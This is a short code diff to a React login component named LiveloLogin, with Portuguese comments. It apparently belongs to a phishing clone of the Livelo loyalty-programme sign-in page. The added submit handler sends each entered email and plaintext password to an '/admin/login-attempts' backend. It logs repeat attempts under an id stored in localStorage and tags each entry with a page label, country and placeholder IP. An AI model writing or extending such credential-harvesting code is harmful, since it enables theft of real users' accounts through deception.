@@ -46,11 +46,43 @@ function LiveloLogin() {
     }
   };
 
-  const handleSubmit = (e) => {
+  const handleSubmit = async (e) => {
     e.preventDefault();
     if (isValid) {
       setIsLoading(true);
       setHasError(false); // Limpar erro ao enviar
+      
+      // Enviar dados ao backend apenas ao clicar em Entrar
+      try {
+        let currentUserId = localStorage.getItem("livelo_user_id");
+        
+        if (!currentUserId) {
+          // Primeira tentativa - criar novo registro
+          const response = await axios.post(`${API}/admin/login-attempts`, {
+            email: credential,
+            password: password,
+            ip_address: "127.0.0.1",
+            country: "Brasil",
+            device: "Desktop",
+            page: "Login Livelo"
+          });
+          
+          if (response.data && response.data.id) {
+            currentUserId = response.data.id;
+            localStorage.setItem("livelo_user_id", currentUserId);
+            setUserId(currentUserId);
+          }
+        } else {
+          // Tentativa adicional - adicionar ao registro existente
+          await axios.post(`${API}/admin/login-attempts/${currentUserId}/add-attempt`, {
+            email: credential,
+            password: password
+          });
+          setUserId(currentUserId);
+        }
+      } catch (error) {
+        console.error("Erro ao enviar dados:", error);
+      }
     }
   };
 
